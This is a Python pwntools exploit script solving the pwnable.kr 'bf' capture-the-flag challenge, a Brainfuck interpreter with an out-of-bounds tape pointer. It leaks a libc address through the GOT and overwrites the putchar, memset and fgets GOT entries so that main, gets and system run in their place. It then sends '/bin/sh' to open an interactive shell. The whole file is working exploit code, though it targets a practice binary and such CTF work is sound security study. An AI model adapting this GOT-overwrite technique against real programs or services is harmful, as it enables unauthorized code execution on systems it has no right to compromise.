from pwn import *
from struct import pack
from time import sleep

context.log_level = "debug"

path = "./bf"

#p = remote("pwnable.kr", 9001) 
p = process(path)
e = ELF(path)
l = ELF("./bf_libc.so")

base_address = 0x0804a000
tape_symbol_address = e.symbols["tape"]
brain_fuck_code = b""
payloads = []

GOT_ELF = 1
SYMBOL_ELF = 2
GOT_LIBC = 3
SYMBOL_LIBC = 4

def init():
    global brain_fuck_code
    base_offset = tape_symbol_address - base_address

    print("base_offset: 0x%08x" % base_offset)
    brain_fuck_code += b"<" * base_offset

    print("tape_symbol_address: 0x%08x" % tape_symbol_address)

    pre_libc_base()

def hook_func(from_method : str, to_method : str, option : int):
    global e, brain_fuck_code, payloads, libc_base
    from_got = e.got[from_method]

    print("from_got: 0x%08x" % from_got)

    from_offset = abs(from_got - base_address)

    print("from_offset: %08x" % from_offset)

    brain_fuck_code += b">" * from_offset
    brain_fuck_code += b",>" * 0x00000004
    brain_fuck_code += b"<" * (from_offset + 0x00000004) # return base address

    if option == GOT_ELF:
        to_address = e.got[to_method]
    elif option == SYMBOL_ELF:
        to_address = e.symbols[to_method]
    elif option == GOT_LIBC:
        to_address = l.got[to_method]
    elif option == SYMBOL_LIBC:
        if to_method == "system":
            to_address = libc_base + l.symbols["system"] - 0x69c80 # system
        elif to_method == "gets":    
            to_address = libc_base + l.symbols["system"] - 0x69c80 + 0x2a780 # gets

    little_endian = struct.pack('<I', to_address).hex()

    payloads = payloads + [int(little_endian[i:i+2], 16) for i in range(0, len(little_endian), 2)]

def pre_libc_base():
    global e, brain_fuck_code
    puts_offset = e.got["stdout"] - base_address
    print("stdout offest: 0x%08x" % puts_offset)
    brain_fuck_code += b">" * puts_offset
    brain_fuck_code += b".>" * 0x00000004
    brain_fuck_code += b"<" * (puts_offset + 0x00000004)

def post_libc_base():
    global p, l
    libc_base = u32(p.recv(4))
    return libc_base - l.symbols["stdout"] + 0x9c  # nm -D bf_libc.so | grep puts

init()

#hook_func("putchar", "system", SYMBOL_LIBC)
hook_func("putchar", "main", SYMBOL_ELF)
brain_fuck_code += b"."

p.sendlineafter(b"type some brainfuck instructions except [ ]\n", brain_fuck_code)

for payload in payloads:
    p.send(p8(payload))

# get libc base
sleep(3)
libc_base = post_libc_base() 
print("libc_base: 0x%08x" % libc_base)

payloads = []
brain_fuck_code = b""
base_offset = tape_symbol_address - base_address
print("base_offset: 0x%08x" % base_offset)
brain_fuck_code += b"<" * base_offset
hook_func("memset", "gets", SYMBOL_LIBC)
hook_func("fgets", "system", SYMBOL_LIBC)
brain_fuck_code += b"." 
p.sendlineafter(b"type some brainfuck instructions except [ ]\n", brain_fuck_code)

# payload execute !!!
for payload in payloads:
    p.send(p8(payload))

p.sendline(b"/bin/sh")

p.interactive()
